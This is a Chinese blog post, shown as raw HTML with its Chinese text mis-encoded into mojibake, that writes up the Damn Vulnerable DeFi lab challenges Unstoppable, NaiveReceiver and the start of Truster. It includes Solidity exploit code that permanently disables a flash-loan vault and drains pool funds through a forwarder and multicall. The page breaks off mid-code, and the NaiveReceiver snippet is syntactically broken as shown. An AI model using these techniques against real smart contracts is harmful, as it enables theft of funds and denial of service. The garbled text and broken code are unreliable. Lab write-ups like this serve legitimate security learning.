<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>blockchain - Damn Vulnerable Defi é¶åœºå¤ç° | HeyGap's_Blog</title><meta name="author" content="HeyGap"><meta name="copyright" content="HeyGap"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="ç»§ç»­åˆ·é¢˜">
<meta property="og:type" content="article">
<meta property="og:title" content="blockchain - Damn Vulnerable Defi é¶åœºå¤ç°">
<meta property="og:url" content="http://heygap.github.io/posts/26167.html">
<meta property="og:site_name" content="HeyGap&#39;s_Blog">
<meta property="og:description" content="ç»§ç»­åˆ·é¢˜">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://heygap.github.io/img/cover7.jpg">
<meta property="article:published_time" content="2024-08-26T12:37:00.000Z">
<meta property="article:modified_time" content="2025-02-12T10:09:13.110Z">
<meta property="article:author" content="HeyGap">
<meta property="article:tag" content="Blockchain">
<meta property="article:tag" content="Smart Contract">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://heygap.github.io/img/cover7.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "blockchain - Damn Vulnerable Defi é¶åœºå¤ç°",
  "url": "http://heygap.github.io/posts/26167.html",
  "image": "http://heygap.github.io/img/cover7.jpg",
  "datePublished": "2024-08-26T12:37:00.000Z",
  "dateModified": "2025-02-12T10:09:13.110Z",
  "author": [
    {
      "@type": "Person",
      "name": "HeyGap",
      "url": "http://heygap.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="http://heygap.github.io/posts/26167.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"æœªæ‰¾åˆ°ç¬¦åˆæ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}","hits_stats":"å…±æ‰¾åˆ° ${hits} ç¯‡æ–‡ç« "}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"ç¹","msgToSimplifiedChinese":"ä¸­"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶å¤±è´¥',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'å¤©',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: {"chs_to_cht":"å·²åˆ‡æ¢ä¸ºç¹ä½“ä¸­æ–‡","cht_to_chs":"å·²åˆ‡æ¢ä¸ºç®€ä½“ä¸­æ–‡","day_to_night":"å·²åˆ‡æ¢ä¸ºæ·±è‰²æ¨¡å¼","night_to_day":"å·²åˆ‡æ¢ä¸ºæµ…è‰²æ¨¡å¼","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'blockchain - Damn Vulnerable Defi é¶åœºå¤ç°',
  isHighlightShrink: true,
  isToc: true,
  pageType: 'post'
}</script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">åŠ è½½ä¸­...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load', preloader.endLoading)

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/background1.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">11</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> æˆ‘çš„æ–‡ç« </span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> å½’æ¡£</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> åˆ†ç±»</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/air-conditioner/"><i class="fa-fw anzhiyu-icon-fan"></i><span> å°ç©ºè°ƒ</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> å…³äºæœ¬äºº</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover7.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">HeyGap's_Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">blockchain - Damn Vulnerable Defi é¶åœºå¤ç°</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> æˆ‘çš„æ–‡ç« </span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> å½’æ¡£</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> åˆ†ç±»</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/air-conditioner/"><i class="fa-fw anzhiyu-icon-fan"></i><span> å°ç©ºè°ƒ</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> å…³äºæœ¬äºº</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">blockchain - Damn Vulnerable Defi é¶åœºå¤ç°</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2024-08-26T12:37:00.000Z" title="å‘è¡¨äº 2024-08-26 20:08:00">2024-08-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2025-02-12T10:09:13.110Z" title="æ›´æ–°äº 2025-02-12 18:02:11">2025-02-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Blockchain/">Blockchain</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">æ€»å­—æ•°:</span><span class="word-count">2.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span><span>12åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">æµè§ˆé‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote class="blockquote-center">
ç»§ç»­åˆ·é¢˜
</blockquote>
<span id="more"></span>
<h1 id="ç¯å¢ƒè®¾ç½®">[0] ç¯å¢ƒè®¾ç½®</h1>
<p>æˆ‘æ˜¯ç”¨ forge æ­å»ºçš„é¶åœºï¼Œè²Œä¼¼è¿˜å¯ä»¥ç”¨ npm
ä¹‹ç±»çš„æ­å»ºï¼Œè¿™æ ·åšé¢˜å°±ç›´æ¥ç”¨ web3.js äº¤äº’å°±å¯ä»¥äº†ã€‚</p>
<p>æ ¹æ®<a
target="_blank" rel="noopener" href="https://github.com/theredguild/damn-vulnerable-defi">å®˜æ–¹è¯´æ˜</a>æ­å»ºé¶åœºç¯å¢ƒã€‚forge
å¯èƒ½ç”±äºç½‘ç»œåŸå› ä¼šå¤±è´¥ï¼Œå¤šå®‰è£…å‡ æ¬¡å°±å¥½äº†</p>
<p><code>forge build</code>ä¹‹åï¼Œæœ¬åœ°æœ‰è¿™æ ·å‡ ä¸ªæ–‡ä»¶å¤¹æ¯”è¾ƒé‡è¦ï¼š</p>
<p><code>src</code>: æ¼æ´æºç ã€‚è¦åšçš„é¢˜ç›®éƒ½åœ¨è¿™é‡Œé¢</p>
<p><code>test</code>:
é¢˜è§£ã€‚å¦‚æœæƒ³è¦è§£é¢˜ï¼Œå¿…é¡»è¿è¡Œ<code>forge test --mp test/&lt;é¢˜ç›®åç§°&gt;/&lt;é¢˜ç›®åç§°&gt;.t.sol -vv</code>ï¼Œ-vvæ˜¯ä¸ºäº†æ‰“å°
emit
logï¼Œæ–¹ä¾¿æˆ‘ä»¬è°ƒè¯•ã€‚è€Œæˆ‘ä»¬çš„æ”»å‡»pocå°±è¦å†™åœ¨ä¸Šé¢è¿™ä¸ª.t.solæ–‡ä»¶çš„test_<é¢˜ç›®åç§°>()è¿™ä¸ªå‡½æ•°ä¸­ã€‚</p>
<h1 id="unstoppable">[1] Unstoppable</h1>
<blockquote>
<p>æ¼æ´ç±»å‹ï¼šrevertæ¡ä»¶è®¾ç½®ä¸å½“</p>
</blockquote>
<p>æœ¬é¢˜æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ”»å‡»é—ªç”µè´·åˆçº¦ï¼Œè®©è¿™ä¸ªé—ªç”µè´·åœ¨ä»»ä½•æ—¶å€™éƒ½æ— æ³•å·¥ä½œã€‚</p>
<p>é—ªç”µè´·ï¼ˆFlash
Loanï¼‰æ˜¯ä¸€ç§æ— éœ€æŠµæŠ¼çš„è´·æ¬¾å½¢å¼ï¼Œå¹¿æ³›ç”¨äºå»ä¸­å¿ƒåŒ–é‡‘èï¼ˆDeFiï¼‰é¢†åŸŸã€‚å®ƒçš„ç‰¹åˆ«ä¹‹å¤„åœ¨äºï¼Œè´·æ¬¾çš„æ•´ä¸ªè¿‡ç¨‹ï¼ˆå€Ÿæ¬¾ã€ä½¿ç”¨èµ„é‡‘ã€è¿˜æ¬¾ï¼‰å¿…é¡»åœ¨åŒä¸€ç¬”äº¤æ˜“ä¸­å®Œæˆã€‚å¦‚æœåœ¨äº¤æ˜“ç»“æŸæ—¶è´·æ¬¾æ²¡æœ‰è¢«å¿è¿˜ï¼Œæ•´ä¸ªäº¤æ˜“å°†è¢«å›æ»šï¼Œç¡®ä¿è´·æ¬¾äººä¸ä¼šæ‰¿æ‹…ä»»ä½•é£é™©ã€‚</p>
<p>æˆ‘ä»¬åˆ†æä»£ç ä¹‹åå¯ä»¥å°†æ¼æ´å®šä½åœ¨ flashLoan
å‡½æ•°é‡Œï¼Œå› ä¸ºåªæœ‰å½“è¿™ä¸ªå‡½æ•°å¤±è´¥ï¼Œmonitor é‡Œçš„ checkFlashLoan æ‰ä¼š emit
ä¸€ä¸ª falseã€‚</p>
<p>è€Œæƒ³è¦è®© flashLoan å¤±è´¥ï¼Œæœ‰å››ä¸ªè§¦å‘ç‚¹ï¼š</p>
<ol type="1">
<li><p><code>if (amount == 0) revert InvalidAmount(0);</code></p></li>
<li><p><code>if (address(asset) != _token) revert UnsupportedCurrency();</code></p></li>
<li><p><code>if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();</code></p></li>
<li><p><code>if ( ... != keccak256("IERC3156FlashBorrower.onFlashLoan")) &#123;revert CallbackFailed();&#125;</code></p></li>
</ol>
<p>ç¬¬ä¸€ä¸ªç‚¹ï¼Œamountæ˜¯ä¼ å‚ï¼Œä¸æ˜¯æˆ‘ä»¬æƒ³è¦æ”¹å˜çš„çŠ¶æ€å˜é‡</p>
<p>ç¬¬äºŒä¸ªç‚¹ï¼Œassetåœ¨æ•´ä¸ªåˆçº¦ä¸­é™¤äº†æ„é€ å‡½æ•°æœ‰æ”¹å˜ä»¥å¤–ï¼Œæ²¡æœ‰æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ç‚¹</p>
<p>ç¬¬å››ä¸ªç‚¹ï¼Œè¿™ä¸ªå‡½æ•°ç­¾åä¸æ­£ç¡®ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬æ— æ³•æ§åˆ¶çš„ã€‚</p>
<p>æ‰€ä»¥å¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬éœ€è¦æ”»å‡»ç¬¬ä¸‰ç‚¹ã€‚ä½†ä¸ºä»€ä¹ˆä¼šè«åå…¶å¦™æœ‰ç¬¬ä¸‰ç‚¹è¿™ä¸ªé™åˆ¶ï¼Ÿæˆ‘ä»¬ä»”ç»†æ¥åˆ†æä¸€ä¸‹ï¼š</p>
<p>é¦–å…ˆï¼ŒbalanceBefore æ˜¯ totalAssets() çš„è¿”å›å€¼ï¼Œassets
æ˜¯é—ªç”µè´·åˆçº¦é‡Œå‰©ä½™çš„ä»£å¸æ•°ç›®ï¼ˆæ³¨æ„è¿™é‡Œæ˜¯ä»£å¸ï¼Œè€Œä¸æ˜¯å®é™…çš„
etherï¼‰ï¼Œsupply æ˜¯é—ªç”µè´·åˆçº¦èƒ½ä¾›ç»™çš„æ•°ç›®ä¸Šé™ï¼Œä¹Ÿå°±æ˜¯ä¸€å¼€å§‹ç»™çš„
1_000_000e18 ä¸ª ERC20 tokenï¼ˆDVTï¼‰ï¼Œè¿™ä¸ªæ•°ç›®æ˜¯ä¸ä¼šå˜çš„ã€‚</p>
<p>æˆ‘ä»¬ä¸€å¼€å§‹æ‹¥æœ‰ 10 ä¸ª DVTï¼Œå¦‚æœç»™é—ªç”µè´·åˆçº¦è½¬ 1 ä¸ª DVT
çš„è¯ï¼Œè¿™é‡Œçš„convertToShares å‡½æ•°è¿”å›å€¼å°±æ°¸è¿œæ˜¯ 999999999999999999999999
äº†,æ­¤æ—¶å°±æ°¸è¿œå…³åœè¿™ä¸ªé—ªç”µè´·äº†ã€‚</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function test_unstoppable() public checkSolvedByPlayer &#123;</span><br><span class="line">    require(vault.convertToShares(vault.totalSupply()) == vault.totalAssets(),&quot;not equal&quot;);</span><br><span class="line">    emit log_named_uint(&quot;Total Supply&quot;, vault.totalSupply());</span><br><span class="line">    emit log_named_uint(&quot;Total Assets&quot;, vault.totalAssets());</span><br><span class="line">    require(token.transfer(address(vault), 1 wei));</span><br><span class="line">    emit log_named_uint(&quot;calc result&quot;, vault.convertToShares(vault.totalSupply()));</span><br><span class="line">    emit log_named_uint(&quot;Total Supply&quot;, vault.totalSupply());</span><br><span class="line">    emit log_named_uint(&quot;Total Assets&quot;, vault.totalAssets());</span><br><span class="line">    require(vault.convertToShares(vault.totalSupply()) != vault.totalAssets(),&quot;equal&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘çªç„¶æ„è¯†åˆ°è¿™ä¸ªé—ªç”µè´·æ˜¯ä¸æ˜¯åªè¦æ¥æ”¶åˆ° fee ç«‹åˆ»å°± dead äº†ã€‚ã€‚</p>
<h1 id="naivereceiver">[2] NaiveReceiver</h1>
<blockquote>
<p>æ¼æ´ç±»å‹ï¼šæƒé™è®¾ç½®é”™è¯¯</p>
</blockquote>
<p>è¿™é“é¢˜è¦æ±‚æˆ‘ä»¬æŠŠ receiver é‡Œçš„ 10 WETH å’Œ pool é‡Œçš„ 1000 WETH
å…¨è½¬ç§»åˆ° recovery è´¦æˆ·ä¸­ã€‚æœ€å isSolved æœ‰å››æ¡é™åˆ¶ï¼š</p>
<ol type="1">
<li><p>player è°ƒç”¨çš„äº¤æ˜“å°äºç­‰äº 2 æ¡</p></li>
<li><p>receiver çš„ weth ä½™é¢ä¸º0</p></li>
<li><p>pool çš„ weth ä½™é¢ä¸º0</p></li>
<li><p>recovery çš„ weth ä½™é¢ä¸º 1010</p></li>
</ol>
<p>å¾ˆæ˜æ˜¾èƒ½çœ‹åˆ° NaiveReceiverPool åˆçº¦ä¸­çš„ withdraw
æƒé™è®¾ç½®çš„ä¸å¯¹ï¼Œä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨è¿™ä¸ªå‡½æ•°å–æ¬¾ã€‚</p>
<p>ä½†æ–°ç‰ˆæœ¬çš„ solidity feature å¡äº†æˆ‘å¥½ä¹…...åŸæ¥ 0.8.0
ä¹‹åçš„ä¸Šæº¢/ä¸‹æº¢éƒ½ä¼šè‡ªåŠ¨æ£€æµ‹äº†..ä¹Ÿå°±æ˜¯è¯´æ²¡åŠæ³•ç›´æ¥é€šè¿‡withdrawç›´æ¥ææ¬¾ã€‚</p>
<p>ä½†è¿™ä¸ªåˆçº¦è¿˜è‡ªå·±å®ç°äº† _msgSender å‡½æ•°ï¼Œå½“è°ƒç”¨è€…æ˜¯ trustedForwarder
æ—¶ï¼Œ_msgSender å‡½æ•°å°±ä¼šå°† msg.dataçš„ æœ€å 20byte
å½“ä½œåœ°å€è¿”å›ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¿…é¡»è¦é€šè¿‡ trustedForwarder çš„ execute
æ–¹æ³•æ¥é—´æ¥è°ƒç”¨ withdrawã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬çŸ¥é“ deposits[deployer] æ˜¯æœ‰ 1000WETH
çš„ï¼Œdeposits[receiver] ä¹Ÿæœ‰
10WETHï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æœ‰å¦‚ä¸‹ä¸¤ç§æ–¹æ³•æ¥è½¬èµ°è¿™ä¸¤ä¸ªåˆçº¦çš„ WETHï¼š</p>
<p>ç¬¬ä¸€ç§æ˜¯é€šè¿‡é—ªç”µè´·çš„ feeï¼ŒæŠŠ receiver é‡Œçš„ 10WETH è½¬ç§»åˆ° deployer
ä¸­ï¼Œç„¶åä¸€å£æ°”æå¹²å‡€ã€‚</p>
<p>ç¬¬äºŒç§æ˜¯æå–ä¸€æ¬¡ deployerï¼Œæå–ä¸€æ¬¡ receiver</p>
<p>ä½†æ— è®ºä»¥ä¸Šå“ªä¸€ç§æ–¹æ³•ï¼Œéƒ½éœ€è¦ç»•è¿‡ä¸Šè¿°çš„ç¬¬ä¸€æ¡é™åˆ¶ï¼šäº¤æ˜“æ•°å°äºç­‰äº 2
æ¡ï¼Œè€Œè¿™å°±ç”¨åˆ°äº† Multicall åˆçº¦é‡Œçš„ multicall æ–¹æ³•äº†ã€‚</p>
<p>æˆ‘ä»¬çœ‹ç¬¬ä¸€ç§æ–¹æ³•ï¼šè°ƒç”¨ 10 æ¬¡ flashLoanï¼Œäº¤ 10 æ¬¡ 1WETH
çš„æ‰‹ç»­è´¹ï¼Œå°±èƒ½æŠŠ WETH æ±‡æ€»åœ¨ deployer çš„ deposits ä¸­ã€‚ä¸è¿‡è¿™ 10
æ¬¡äº¤æ˜“éœ€è¦ç”¨ multicall
ä¸€èµ·æ‰§è¡Œï¼Œä¸ç„¶ä¼šè¶…å‡ºç¬¬ä¸€æ¡é™åˆ¶çš„è¦æ±‚ã€‚ç„¶åï¼Œæˆ‘ä»¬å†é€šè¿‡ execute è°ƒç”¨
withdrawï¼Œå°±å¯ä»¥æŠŠè¿™é‡Œé¢çš„å­˜æ¬¾å…¨éƒ½è½¬åˆ° recovery
ä¸­äº†ã€‚ä¸è¿‡è¿™é‡Œæˆ‘ä»¬é€‰æ‹©æŠŠä¸¤æ¡äº¤æ˜“åˆå¹¶ä½œä¸€æ¡ï¼Œä¹Ÿå°±æ˜¯æŠŠ withdraw çš„ abi
ç¼–ç ä¸å‰10æ¡ flashLoan çš„ç¼–ç åˆåœ¨ä¸€èµ·ã€‚expå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function test_naiveReceiver() public checkSolvedByPlayer &#123;</span><br><span class="line">    bytes[] memory callData = new bytes[](11);</span><br><span class="line">    for (uint256 i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">        callData[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, bytes(&quot;&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    callData[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery)));</span><br><span class="line">        bytes32(uint256(uint160(deployer))),</span><br><span class="line">    );</span><br><span class="line">    bytes memory multicallData = abi.encodeCall(Multicall.multicall, callData);</span><br><span class="line">    BasicForwarder.Request memory request = BasicForwarder.Request(&#123;</span><br><span class="line">        from: player,</span><br><span class="line">        target: address(pool),</span><br><span class="line">        value: 0,</span><br><span class="line">        gas: 1e7,</span><br><span class="line">        nonce: forwarder.nonces(player),</span><br><span class="line">        data: multicallData,</span><br><span class="line">        deadline: block.timestamp + 1 days</span><br><span class="line">    &#125;);</span><br><span class="line">    bytes32 requestHash = keccak256(</span><br><span class="line">        abi.encodePacked(</span><br><span class="line">            &quot;\x19\x01&quot;,</span><br><span class="line">            forwarder.domainSeparator(),</span><br><span class="line">            forwarder.getDataHash(request)</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);</span><br><span class="line">    bytes memory signature = abi.encodePacked(r, s, v);</span><br><span class="line">    forwarder.execute(request, signature);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="truster">[3] Truster</h1>
<p>è¿™é“é¢˜çš„åˆçº¦ä»£ç é‡å¾ˆå°ï¼Œå°±å®ç°äº†ä¸€ä¸ªé—ªç”µè´·ï¼Œè®©æˆ‘ä»¬é€šè¿‡é—ªç”µè´·çš„äº¤æ˜“è¿‡ç¨‹ï¼ŒæŠŠåˆçº¦é‡Œçš„é’±éƒ½è½¬èµ°ã€‚</p>
<p>æƒ³è½¬èµ°ä»£å¸ä¸€å…±æœ‰ä¸¤ç§æ–¹æ³•ï¼Œç¬¬ä¸€ç§æ˜¯ç›´æ¥è®©å¯ä¿¡ç”¨æˆ·è°ƒç”¨ transfer
å‡½æ•°ï¼Œç¬¬äºŒç§æ˜¯è®©æ¶æ„ç”¨æˆ·æˆä¸ºå¯ä¿¡ç”¨æˆ·åï¼Œå†é€šè¿‡æ¶æ„ç”¨æˆ·è½¬è´¦ã€‚ç”±äº
flashLoan è®¾ç½®äº†ä»£å¸æ•°ç›®æ£€æŸ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬æ²¡åŠæ³•åœ¨ flashLoan çš„
target.functionCall ä¸­ç›´æ¥è°ƒç”¨ transferï¼Œä½†æˆ‘ä»¬å¯ä»¥é‡‡å–
approveï¼Œè®©æ¶æ„åˆçº¦æœ‰æ“æ§ä»£å¸çš„æƒé™ã€‚</p>
<p>exp å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">contract TrusterExploiter &#123;</span><br><span 